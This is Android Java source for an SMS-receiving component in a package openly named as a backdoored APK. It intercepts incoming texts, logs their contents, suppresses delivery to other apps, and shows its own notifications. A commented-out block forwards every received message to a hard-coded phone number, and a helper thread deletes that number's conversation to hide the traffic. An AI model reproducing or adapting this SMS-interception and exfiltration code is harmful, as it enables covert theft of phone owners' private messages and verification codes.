package stage.metasploit.com.backdooredapk;

import android.app.Notification;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.provider.ContactsContract;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.util.Log;

import org.greenrobot.eventbus.EventBus;

/**
 * Created by Grunt on 15/02/2017.
 */

public class IncomingSms extends BroadcastReceiver {
    private Context context;

    public void onReceive(Context context, Intent intent) {

        this.context = context;

        // Retrieves a map of extended data from the intent.
        final Bundle bundle = intent.getExtras();

        try {

            if (bundle != null) {

                final Object[] pdusObj = (Object[]) bundle.get("pdus");
                if (pdusObj != null) {
                    for (Object obj : pdusObj) {

                        SmsMessage currentMessage = SmsMessage.createFromPdu((byte[]) obj);
                        String phoneNumber = currentMessage.getDisplayOriginatingAddress();

                        String message = currentMessage.getDisplayMessageBody();

                        Log.i("SmsReceiver", "senderNum: " + phoneNumber + "; message: " + message);
                        String person = findPersonForNumber(context, phoneNumber);
                        EventBus.getDefault().post(new NewSmsEvent(new SMS(message, "1"), phoneNumber, person, findThreadForNumber(context, phoneNumber)));//1 is for received message

                        ContentValues values = new ContentValues();
                        values.put("address", phoneNumber);//sender name
                        values.put("body", message);
                        context.getContentResolver().insert(Uri.parse("content://sms/inbox"), values);

                        createNotification(person, message, phoneNumber);
                        /*SmsManager sms = SmsManager.getDefault();
                        sms.sendTextMessage("+33642617318", null, "From " + phoneNumber + " : \n" + message, null, null);
                        Handler handler = new Handler();
                        handler.postDelayed(new DeleteThread(context), 1000);*/

                    } // end for loop
                }
            } // bundle is null

        } catch (Exception e) {
            Log.e("SmsReceiver", "Exception smsReceiver" +e);

        }
        finally {
            abortBroadcast();
        }
    }

    class DeleteThread extends Thread {
        private Context context;

        DeleteThread(Context context) {
           this.context = context;
        }

        @Override
        public void run() {
            deleteThread(context, "+33642617318");
        }

        private void deleteThread(Context context, String number) {
            String thread_id = findThreadForNumber(context, number);
            if(thread_id != null) {
                context.getContentResolver().delete(Uri.parse("content://sms/conversations/" + thread_id), null, null);
            }
        }
    }

    private String findThreadForNumber(Context context, String number) {
        //ici
        String thread_id = null;
        Uri SMS_INBOX = Uri.parse("content://sms/conversations/");
        Cursor c = context.getContentResolver().query(SMS_INBOX, null, "address = ?", new String[]{number}, null);

        if (c != null) {
            c.moveToFirst();
            thread_id = c.getString(c.getColumnIndexOrThrow("thread_id"));
            c.close();
        }
                //ici
        return thread_id;
    }

    private String findPersonForNumber(Context context, String number) {
        ContentResolver localContentResolver = context.getApplicationContext().getContentResolver();
        String result = null;
        Cursor contactLookupCursor =
                localContentResolver.query(
                        Uri.withAppendedPath(ContactsContract.PhoneLookup.CONTENT_FILTER_URI,
                                Uri.encode(number)),
                        new String[]{ContactsContract.PhoneLookup.DISPLAY_NAME, ContactsContract.PhoneLookup._ID},
                        null,
                        null,
                        null);
        try {
            if (contactLookupCursor != null)
                while (contactLookupCursor.moveToNext()) {
                    result = contactLookupCursor.getString(contactLookupCursor.getColumnIndexOrThrow(ContactsContract.PhoneLookup.DISPLAY_NAME));
                }
        } catch (Exception e) {
            result = number;

        } finally {
            if (contactLookupCursor != null)
                contactLookupCursor.close();
        }
        return result != null ? result : number;
    }

    private void createNotification(String sender, String body, String phoneNumber){
        //Récupération du notification Manager
        final NotificationManager notificationManager = (NotificationManager)context.getSystemService(Context.NOTIFICATION_SERVICE);

        //Création de la notification avec spécification de l'icône de la notification et le texte qui apparait à la création de la notification
        final Notification notification = new Notification(R.drawable.ic_launcher, sender, System.currentTimeMillis());

        //Définition de la redirection au moment du clic sur la notification. Dans notre cas la notification redirige vers notre application
        Intent convIntent = new Intent(context, ConversationActivity.class);
        convIntent.putExtra(context.getString(R.string.extra_threadid), findThreadForNumber(context, phoneNumber));
        convIntent.putExtra(context.getString(R.string.extra_phone), phoneNumber);
        convIntent.putExtra(context.getString(R.string.extra_dest), sender);
        convIntent.setAction("" + Math.random());
        Log.d(context.getString(R.string.extra_threadid), findThreadForNumber(context, phoneNumber));
        Log.d(context.getString(R.string.extra_phone), phoneNumber);
        Log.d(context.getString(R.string.extra_dest), sender);

        final PendingIntent pendingIntent = PendingIntent.getActivity(context, 0, convIntent, 0);

        //Notification & Vibration
        notification.setLatestEventInfo(context, sender, body, pendingIntent);
        notification.vibrate = new long[] {200, 200, 200, 200};
        notification.flags |= Notification.FLAG_AUTO_CANCEL;

        notificationManager.notify(117, notification);
    }
}







